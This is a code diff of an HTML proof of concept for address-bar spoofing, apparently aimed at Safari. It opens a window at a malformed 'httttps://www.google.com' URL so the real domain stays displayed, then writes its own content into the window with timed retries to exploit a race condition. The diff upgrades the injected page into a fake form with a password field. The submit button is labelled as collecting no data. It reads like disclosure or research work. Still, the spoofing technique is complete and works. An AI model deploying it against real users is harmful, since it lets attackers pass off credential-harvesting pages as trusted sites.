@@ -1,17 +1,20 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <button onclick="spoof()">Click to Spoof</button>
+  <button onclick="spoof()">Click to spoof</button>
 
   <script>
     function spoof() {
-      // Buka domain invalid protocol → Safari gagal load tapi tetap tampil di address bar
-      let win = window.open("httttps://www.google.com", "_blank");
+      let win = window.open("httttps://www.google.com/gen_204", "_blank");
 
-      // Inject konten sendiri (karena halaman gagal load, jadi fallback ke controllable document)
       let payload = `
-        <h1>This is NOT Google!</h1>
-        <p>You are seeing spoofed content.</p>
+        <h1 style="text-align:center; color:red;">⚠️ This is NOT Google!</h1>
+        <div style="display:flex; flex-direction:column; align-items:center; margin-top:50px;">
+          <input type="text" placeholder="Type something here..." style="padding:10px; width:200px; margin:5px;">
+          <input type="password" placeholder="Another input..." style="padding:10px; width:200px; margin:5px;">
+          <button onclick="alert('Demo only — no data collected')" 
+                  style="padding:10px 20px; margin-top:10px;">Submit</button>
+        </div>
       `;
 
       let inject = () => {
@@ -20,11 +23,10 @@
           win.document.write(payload);
           win.document.close();
         } catch (e) {
-          console.log("Blocked:", e);
+          console.log('Blocked:', e);
         }
       };
 
-      // Timing untuk mengakali race condition
       setTimeout(inject, 200);
       setTimeout(inject, 500);
       setTimeout(inject, 1000);
